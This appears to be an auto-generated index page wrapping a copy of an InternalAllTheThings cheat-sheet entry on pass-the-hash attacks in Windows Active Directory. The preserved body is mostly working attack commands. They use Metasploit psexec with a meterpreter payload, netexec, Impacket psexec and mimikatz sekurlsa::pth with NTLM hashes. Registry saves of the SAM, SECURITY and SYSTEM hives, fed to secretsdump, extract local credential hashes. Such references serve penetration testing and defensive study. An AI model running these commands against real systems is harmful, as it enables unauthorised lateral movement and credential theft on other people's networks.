---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Hash - Pass the Hash

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-hash-pass-the-hash` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/hash-pass-the-hash.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Hash - Pass the Hash](../../topics/active-directory/hash-pass-the-hash.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-hash-pass-the-hash |
| name | Hash - Pass the Hash |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/hash-pass-the-hash.md |

## Preserved Source Material

````yaml
_body: "# Hash - Pass the Hash\n\nThe types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows\
  \ Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.\n\n* Metasploit\n\
  \n  ```powershell\n  use exploit/windows/smb/psexec\n  set RHOST 10.2.0.3\n  set SMBUser jarrieta\n  set SMBPass nastyCutt3r\
  \  \n  # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.\n  # NOTE2: Require the full\
  \ NT hash, you may need to add the \"blank\" LM (aad3b435b51404eeaad3b435b51404ee)\n  set PAYLOAD windows/meterpreter/bind_tcp\n\
  \  run\n  shell\n  ```\n\n* netexec\n\n  ```powershell\n  nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d'\
  \ -x \"whoami\"\n  ```\n\n* Impacket suite\n\n  ```powershell\n  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes\
  \ :489a04c09a5debbc9b975356693e179d\n  ```\n\n* Windows RDP and mimikatz\n\n  ```powershell\n  sekurlsa::pth /user:Administrator\
  \ /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863\n  sekurlsa::pth /user:<user name> /domain:<domain name>\
  \ /ntlm:<the users ntlm hash> /run:\"mstsc.exe /restrictedadmin\"\n  ```\n\nYou can extract the local **SAM database** to\
  \ find the local administrator hash :\n\n```powershell\nC:\\> reg.exe save hklm\\sam c:\\temp\\sam.save\nC:\\> reg.exe save\
  \ hklm\\security c:\\temp\\security.save\nC:\\> reg.exe save hklm\\system c:\\temp\\system.save\n$ secretsdump.py -sam sam.save\
  \ -security security.save -system system.save LOCAL\n```\n\n## References\n\n* [Passing the hash with native RDP client\
  \ (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)"
_relative_path: active-directory/hash-pass-the-hash.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/hash-pass-the-hash.md
````
